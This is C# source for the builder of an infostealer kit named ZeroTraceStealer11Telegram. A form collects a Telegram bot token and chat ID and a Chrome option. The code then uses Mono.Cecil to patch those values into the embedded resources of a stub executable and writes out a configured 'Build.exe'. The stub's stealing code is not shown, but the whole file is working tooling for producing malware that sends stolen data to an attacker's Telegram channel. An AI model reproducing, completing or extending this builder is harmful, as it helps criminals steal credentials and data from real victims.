using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using DevExpress.XtraEditors;
using Mono.Cecil;

namespace ZeroTraceStealer11Telegram
{
    public partial class Form1 : DevExpress.XtraEditors.XtraForm
    {
        public Form1()
        {
            InitializeComponent();

        }

        private void simpleButton1_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(textEdit1.Text) || string.IsNullOrWhiteSpace(textEdit2.Text))
            {
              
                MessageBox.Show("Bot token and chat ID cannot be empty.", "Validation Error",
                                MessageBoxButtons.OK, MessageBoxIcon.Error);
                return; 
            }

          
            string botToken = textEdit1.Text;
            string chatId = textEdit2.Text;


            string chrome = "0";
            if (checkEdit1.Checked)
            {
                chrome = "1";
              
            }
            else
            {
     
            }

            string outputpath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Build.exe";

            ZeroTrace.Builder.Build.ModifyAndSaveAssembly(botToken, chatId, chrome, outputpath);


            MessageBox.Show("Build Success!");


        }
    }
}


namespace ZeroTrace.Builder
{


    internal sealed class Build
    {



        private static AssemblyDefinition ReadStub(string stubPath)
        {
            if (!File.Exists(stubPath))
                throw new FileNotFoundException("Stub file not found.", stubPath);

            return AssemblyDefinition.ReadAssembly(stubPath);
        }

        private static void WriteStub(AssemblyDefinition definition, string outputPath)
        {
            definition.Write(outputPath);
        }





        private static void UpdateResource(string resourceName, string newContent, AssemblyDefinition assembly)
        {
            // Find the existing resource by name
            var existingResource = assembly.MainModule.Resources.OfType<EmbeddedResource>()
                                    .FirstOrDefault(r => r.Name.Equals(resourceName));

            if (existingResource != null)
            {
                // Remove the existing resource
                assembly.MainModule.Resources.Remove(existingResource);
            }

            // Add the new resource
            var newResource = new EmbeddedResource(resourceName, Mono.Cecil.ManifestResourceAttributes.Public, Encoding.UTF8.GetBytes(newContent));
            assembly.MainModule.Resources.Add(newResource);
        }

        public static void UpdateIPAndPort(string newIP, string newPort, string chrome, AssemblyDefinition assembly)
        {
            // Remove and add the IP and Port resources
            UpdateResource("ZeroTraceOfficialStub.Resources.ip.txt", newIP, assembly);
            UpdateResource("ZeroTraceOfficialStub.Resources.port.txt", newPort, assembly);

            UpdateResource("ZeroTraceOfficialStub.Resources.uac.txt", chrome, assembly);


        }


        //public static void ModifyObfuscatedAssembly(string newIP, string newPort, string outputPath)
        //{
        //    try
        //    {
        //        string stubPath = Environment.CurrentDirectory + "\\Stub\\DestinyClientObf.exe";

        //        Console.WriteLine(stubPath);
        //        Console.ReadLine();
        //        // Read the stub assembly
        //        var assembly = ReadStub(stubPath);

        //        // Update the IP and Port resources
        //        UpdateIPAndPort(newIP, newPort, assembly);

        //        // Write the modified assembly to a file
        //        WriteStub(assembly, outputPath);
        //    }
        //    catch (Exception ex)
        //    {
        //        throw new Exception($"Failed to modify assembly: {ex.Message}");
        //    }
        //}


        public static void ModifyAndSaveAssembly(string newIP, string newPort, string chrome, string outputPath)
        {
            try
            {
                string stubPath = Environment.CurrentDirectory + "\\Stub\\ZeroStub.exe";
                Console.WriteLine(stubPath);
                Console.ReadLine();
                // Read the stub assembly
                var assembly = ReadStub(stubPath);
                // Update the IP, Port and injection setting resources
                UpdateIPAndPort(newIP, newPort, chrome, assembly);
                // Write the modified assembly to a file
                WriteStub(assembly, outputPath);
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to modify assembly: {ex.Message}");
            }
        }
    }

}